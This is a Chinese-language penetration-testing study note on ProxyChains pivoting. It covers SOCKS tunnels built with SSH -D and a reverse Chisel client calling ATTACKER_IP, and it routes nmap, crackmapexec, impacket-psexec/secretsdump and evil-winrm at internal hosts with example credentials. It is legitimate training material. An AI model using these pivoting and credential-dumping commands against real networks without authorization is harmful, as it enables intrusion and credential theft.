# 第 68 章 - ProxyChains

## 標籤

- #cpts
- #chapter
- #proxychains
- #pivoting

## 學習目標

- 能設定 /etc/proxychains4.conf 指向 SOCKS proxy。
- 理解 dynamic_chain vs strict_chain 的差異與選擇時機。
- 知道 proxy_dns 為何重要以及如何驗證。
- 能用 proxychains4 包覆 curl、nmap、crackmapexec 等工具。
- 知道哪些工具不適合走 ProxyChains（raw socket、UDP）。

---

## 理論基礎

```text
ProxyChains 運作原理：

LD_PRELOAD hook → 攔截 connect() 系統呼叫
                → 將 TCP 連線重導向到 SOCKS/HTTP proxy
                → proxy 代為建立對目標的連線

關鍵限制：
  1. 只攔截 TCP connect()：UDP / raw socket（ICMP、SYN）無效
  2. 工具必須動態連結 libc：靜態編譯工具無法被 hook
  3. 多執行緒高並發工具效果差（延遲、超時）

三種 chain 模式：
  strict_chain：按設定檔順序逐一連接，任何一台失敗 → 整個連線失敗
    適合：代理穩定、路徑確定的情況

  dynamic_chain：跳過失敗的代理，自動用下一台
    適合：代理不穩或多台備援的情況（日常首選）

  round_robin_chain：輪流使用代理列表
    適合：負載分散（滲透測試少用）

DNS 解析問題：
  若不啟用 proxy_dns → DNS 在攻擊機本地解析
    → 內網 hostname 無法解析（得到外網 IP 或 NXDOMAIN）
  啟用 proxy_dns → DNS 查詢也走 SOCKS proxy
    → 在 pivot 主機那端解析，能取得正確內網 IP
```

---

## 方法一：設定 proxychains4.conf

```bash
# 編輯設定檔（需要 root）
sudo nano /etc/proxychains4.conf
# 或
sudo vim /etc/proxychains4.conf

# ── 關鍵設定選項 ──

# 選擇 chain 模式（擇一，預設 strict_chain）
# strict_chain       ← 嚴格順序，任一失敗即中止（適合穩定環境）
dynamic_chain         # ← 動態跳過失敗代理（日常首選）
# round_robin_chain  ← 輪流使用

# 啟用 proxy_dns（避免 DNS 洩漏，幾乎必開）
proxy_dns
# 讓 DNS 查詢也透過代理解析，而非在本機查詢

# 超時設定（毫秒，預設太短容易假失敗）
tcp_read_time_out 15000    # 讀取超時 15 秒（預設 15000，視情況增加）
tcp_connect_time_out 8000  # 連線超時 8 秒（預設 8000）

# ── [ProxyList] 區塊（設定檔末尾）──
[ProxyList]
# 格式：類型  IP  PORT  [使用者名稱  密碼]

# SSH -D 1080 建立的 SOCKS5 動態代理
socks5  127.0.0.1  1080

# Chisel SOCKS 代理（Chisel client --socks5，通常 1080）
socks5  127.0.0.1  1080

# Ligolo-ng 不直接提供 SOCKS，用 full-route 替代
# 若要 SOCKS，在 Ligolo agent 端額外架 Chisel 或 SSH -D

# HTTP proxy（較少用於滲透測試）
# http  127.0.0.1  8080
```

---

## 方法二：建立 SOCKS proxy（前置條件）

```bash
# ── 方式 A：SSH 動態代理（-D）──
ssh -D 1080 -N -f user@PIVOT_IP
# -D 1080  → 在攻擊機 localhost:1080 建立 SOCKS5 代理
# -N       → 不執行遠端命令（只建隧道）
# -f       → 背景執行
# 結果：所有走 127.0.0.1:1080 的流量 → Pivot Host → 內網

# 確認監聽中
ss -tlnp | grep 1080
# 看到 127.0.0.1:1080 LISTEN → 代理就緒

# ── 方式 B：Chisel SOCKS（Pivot 主機無 SSH 時）──
# 攻擊機（server）
./chisel server --port 8888 --reverse --socks5
# --reverse → 允許 client 發起反向 SOCKS tunnel
# --socks5  → 提供 SOCKS5 服務

# Pivot 主機（client）
./chisel client ATTACKER_IP:8888 R:socks
# R:socks → 在攻擊機建立 SOCKS5（預設 1080）

# proxychains4.conf 設定：
# socks5  127.0.0.1  1080
```

---

## 方法三：驗證 proxy 是否可用

```bash
# 最小化測試：用 curl 透過 proxychains 連內網服務
proxychains4 curl http://172.16.0.5/
# proxychains4  → 包覆工具，讓其流量走代理
# 有回應 → SOCKS 代理正常運作，內網可達

# 靜默模式（減少 proxychains 的 debug 輸出）
proxychains4 -q curl http://172.16.0.5/
# -q → quiet，隱藏 [proxychains] 開頭的連線訊息

# 測試 DNS 解析（確認 proxy_dns 有效）
proxychains4 -q curl http://internal-hostname.corp/
# 若無 proxy_dns → DNS 本地解析失敗（connection refused 或 curl: (6) Could not resolve host）
# 加了 proxy_dns → DNS 在 pivot 端解析，能取得正確 IP

# 測試 SMB 是否可達（crackmapexec）
proxychains4 -q crackmapexec smb 172.16.0.0/24
# crackmapexec → 支援 TCP connect，可走 proxychains
# 注意：掃描 /24 速度慢（逐 IP 逐 TCP connect），調高 timeout
```

---

## 方法四：proxychains + nmap 掃描內網

```bash
# ── nmap 透過 proxychains 的正確用法 ──

# TCP connect scan（-sT）：唯一能走 proxychains 的 nmap 模式
proxychains4 -q nmap -sT -p 22,80,443,445,3389,1433 172.16.0.5
# -sT → TCP connect（不需要 root，用完整 TCP 三次握手）
#       走 proxychains 必須用 -sT，其他模式無效

# 不指定版本（版本掃描會 timeout）
# -sV 在代理環境下非常慢，先確認埠開放再用

# 主機存活確認（但 ICMP 不能走 proxy）
proxychains4 -q nmap -sT -p 80 --open 172.16.0.0/24
# 掃描整個 /24 確認哪些 IP 的 port 80 開放
# ICMP ping 不能走 proxy → 改用 TCP port 掃描推斷主機存活

# 錯誤示範（不能走 proxychains 的 nmap 模式）
# proxychains4 nmap -sS 172.16.0.5   ← SYN scan（raw socket，無效）
# proxychains4 nmap -sU 172.16.0.5   ← UDP scan（UDP，無效）
# proxychains4 nmap -sP 172.16.0.5   ← ICMP ping（無效）
# proxychains4 nmap -O  172.16.0.5   ← OS detection（需 raw socket，無效）
```

---

## 方法五：proxychains + 常用滲透工具

```bash
# ── crackmapexec（SMB/WinRM/LDAP）──
proxychains4 -q crackmapexec smb 172.16.0.5 -u admin -p 'Password123'
# crackmapexec → 純 TCP，可走 proxychains

proxychains4 -q crackmapexec winrm 172.16.0.5 -u admin -p 'Password123'
# WinRM → TCP 5985，可走 proxychains

# ── impacket 工具 ──
proxychains4 -q impacket-psexec admin:'Password123'@172.16.0.5
# PSExec → TCP SMB 445，可走 proxychains

proxychains4 -q impacket-secretsdump admin:'Password123'@172.16.0.5
# secretsdump → TCP SMB，可走 proxychains

# ── evil-winrm ──
proxychains4 -q evil-winrm -i 172.16.0.5 -u admin -p 'Password123'
# evil-winrm → WinRM TCP 5985，可走 proxychains

# ── ssh 透過 proxy 連到更深的主機 ──
proxychains4 -q ssh user@172.16.0.10
# SSH 是 TCP 連線，可走 proxychains
# 用途：從攻擊機透過 SOCKS 連到內網 SSH（不需 pivot 主機轉）

# ── web 應用工具 ──
proxychains4 -q gobuster dir -u http://172.16.0.5/ -w /usr/share/wordlists/dirb/common.txt
# 目錄爆破，純 TCP HTTP，可走 proxychains（但速度較慢）

proxychains4 -q nikto -h http://172.16.0.5/
# Web 漏洞掃描，TCP HTTP，可走 proxychains

# ── Firefox 透過 SOCKS 瀏覽器存取（另一種方式）──
# 在 Firefox 設定 → Network Settings → Manual proxy → SOCKS5 127.0.0.1:1080
# 勾選「Proxy DNS when using SOCKS v5」（等同 proxy_dns）
# 不需要 proxychains，直接在瀏覽器設定代理
```

---

## 決策流程

```
需要讓工具走內網代理
    ↓
確認 SOCKS proxy 已建立（ss -tlnp | grep 1080）
    ↓
確認 /etc/proxychains4.conf 設定：
  - dynamic_chain（首選）
  - proxy_dns（必開，避免 DNS 失敗）
  - socks5 127.0.0.1 PORT
    ↓
最小化驗證：
  proxychains4 -q curl http://172.16.0.5/ → 有回應？
    是 → 代理正常，繼續使用工具
    否 → 排查：SOCKS 是否真的在監聽？目標是否可達？
    ↓
選擇工具：
  需要 Web/API 互動？
    → curl / gobuster / nikto（TCP HTTP，支援）
  需要 Windows 服務存取？
    → crackmapexec / evil-winrm / impacket（TCP，支援）
  需要 nmap 掃描？
    → nmap -sT（TCP connect，支援）
    → 不要用 -sS / -sU / -O（raw socket，不支援）
  需要整段 IP 可 ping/掃描？
    → 改用 full-route（Ligolo-ng + ip route add）
```

---

## 速查表

```bash
# 設定檔關鍵行
dynamic_chain
proxy_dns
socks5  127.0.0.1  1080        # 在 [ProxyList] 下

# 建立 SSH SOCKS proxy
ssh -D 1080 -N -f user@PIVOT_IP

# 驗證 proxy 可用
proxychains4 -q curl http://172.16.0.5/

# nmap（TCP connect only）
proxychains4 -q nmap -sT -p 22,80,443,445 172.16.0.5

# crackmapexec
proxychains4 -q crackmapexec smb 172.16.0.5 -u user -p pass

# impacket
proxychains4 -q impacket-psexec user:'pass'@172.16.0.5
```

---

## 常見錯誤與排查

- `[proxychains] Strict chain ... 127.0.0.1:1080 ... TIMEOUT` → SOCKS proxy 未啟動；先確認 `ss -tlnp | grep 1080`。
- curl 回報 `Could not resolve host` → `proxy_dns` 未啟用或 DNS 仍在本地解析；確認設定檔有 `proxy_dns` 且設定檔正確載入。
- nmap 掃描無結果 → 確認用的是 `-sT`，不是 `-sS` 或其他 raw socket 模式。
- crackmapexec 全部 timeout → 增加 `tcp_read_time_out` 到 30000 毫秒。
- 靜態編譯的工具走不了 proxychains → 改用工具自帶的 `--proxy` 參數（如 curl `--proxy socks5h://127.0.0.1:1080`）。

---

## 關聯筆記

- [[64-網路路由基礎|第 64 章 - 網路路由基礎]]
- [[65-SSH埠轉發|第 65 章 - SSH 埠轉發]]
- [[66-Chisel|第 66 章 - Chisel]]
- [[67-Ligolo-ng|第 67 章 - Ligolo-ng]]
- [[69-多跳Pivoting|第 69 章 - 多跳 Pivoting]]
- [[08-Volume-8-Pivoting-Index|Vol.8 - Pivoting, Tunneling and Port Forwarding]]
